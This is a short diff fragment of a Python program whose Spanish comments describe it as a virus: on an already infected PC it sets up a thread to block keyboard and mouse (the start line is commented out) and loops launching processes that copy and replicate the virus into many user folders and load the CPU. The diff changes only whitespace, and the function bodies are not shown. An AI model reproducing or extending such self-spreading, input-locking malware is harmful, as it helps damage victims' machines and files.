@@ -196,8 +196,10 @@ if __name__ == '__main__':
         exit()
     else:                   # Solo se ejecuta si la PC ya está infectada
         block = threading.Thread(target=Block)   # Bloquea Teclado y mouse
+
+
+
         #block.start()           # Bloquea teclado y mouse 
-        
         while(True):
             autocopy = Process(target=AutoCopy)   # Copia y replica el virus en muchas carpetas del usuario
             cpuS = Process(target=CPU)
